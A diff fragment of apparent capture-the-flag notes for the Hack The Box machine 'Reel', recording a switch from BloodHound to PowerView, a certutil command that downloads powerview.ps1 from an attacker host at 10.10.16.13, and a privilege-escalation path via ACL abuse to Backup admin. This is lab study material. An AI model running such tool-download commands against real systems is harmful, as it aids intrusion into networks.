@@ -166,3 +166,8 @@ BloodHound not working.
 I'll just go with powerview.
 
 `certutil -urlcache -f http://10.10.16.13/powerview.ps1 powerview.ps1`
+
+### Root
+Tom ACL -> Claire -> Backup admin
+  
+  https://0xdf.gitlab.io/2018/11/10/htb-reel.html#privesc-tom---claire
